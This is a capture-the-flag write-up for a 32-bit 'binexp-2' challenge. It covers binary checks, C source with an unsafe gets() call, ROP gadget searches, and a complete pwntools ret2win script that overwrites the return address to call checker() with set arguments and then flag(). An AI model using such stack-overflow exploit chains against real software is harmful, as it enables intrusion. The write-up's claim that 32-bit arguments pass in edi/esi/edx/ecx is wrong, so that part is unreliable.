# Binexp-2

> **Description:** -
>
> **Remote Instance:** nc 54.255.236.13 9002

### Basic File Checks

Perform basic file checks to understand how the binary was compiled.

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ file binexp-2 
binexp-2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=252bc36fa20771b3a196d141a85c5da2c671263b, not stripped
```

From the command above, some of the major takeaways are:

- ELF File Type.
- 32-bit.
- Least Significant Bit (LSB) executable.
- Functions name not stripped.

We can also perform binary protection checks to get an overall idea on where to start tackling the challenge. `No PIE` indicates that we do not have to worry about Address Randomization when performing a `ret2win` attack.

```
──(kali💀JesusCries)-[~/Desktop]
└─$ checksec --file=binexp-2 
[*] '/home/kali/Desktop/binexp-2'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Static Code Analysis

By looking at the source code, it appears to be a same `ret2win` attack as `binexp-1`, but this time with parameters.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

bool solve1 = false;

void checker(int check1, int check2) {

	if (check1 == 0xDEADBEEF) {
		if (check2 == 0xCAFEBABE) {
			solve1 = true;
		}
		else {
			puts("Wrong!");
			exit(0);
		}
	}
	else {
		puts("Wrong!");
		exit(0);
	}
}

void flag() {
	char flag[64];

	if (solve1) {
		FILE *f = fopen("flag.txt", "r");
		fgets(flag, 64, f);
		printf("%s", flag);
		fflush(stdout);
	}
	else {
		puts("Wrong!");
	}
}

int main(int argc, char *argv[]) {
	char buf[10];

	puts("Can you pass the checker?");
	gets(buf);
	puts("Welp... Guest not.");
}
```

### ROPGadgets

In order to overwrite parameter values, we have to first clear the registers value responsible for storing the parameter. This is done by using ROPGadgets to pop the registers off the stack.

The calling convention for 64-bit registers is as follows: `rdi` > `rsi` > `rdx` > `rcx` > `r8` > `r9`

Since the binary is 32-bit architecture, the calling convention will be `edi` > `esi` > `edx` > `ecx`

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ ropgadget binexp-2 | grep "pop edi"
0x08048692 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048691 : fiadd word ptr [ebx + 0x5e5b1cc4] ; pop edi ; pop ebp ; ret
0x08048690 : jb 0x8048670 ; add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048693 : les ebx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048695 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048697 : pop edi ; pop ebp ; ret
0x08048696 : pop esi ; pop edi ; pop ebp ; ret
0x08048694 : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
                                                                                                                                                                                                                 
┌──(kali💀JesusCries)-[~/Desktop]
└─$ ropgadget binexp-2 | grep "pop esi"
0x08048692 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048690 : jb 0x8048670 ; add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048693 : les ebx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048695 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048696 : pop esi ; pop edi ; pop ebp ; ret
0x08048694 : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
```

### Solution

Since we do not have an ideal candidate of ROPGadgets to perform exploitation manually. We can use the `ropper` class in pwntools to automate the process:

```
#!/usr/bin/env python3

from pwn import *

# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './binexp-2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(200))

# Start program
io = start()

# ROP object
rop = ROP(elf)
rop.checker(0xDEADBEEF, 0xCAFEBABE)
rop.flag()

# Build the payload
payload = flat({
    offset: rop.chain()
})

# Send the payload
io.sendlineafter(b'?', payload)

# Get flag
io.interactive()
```
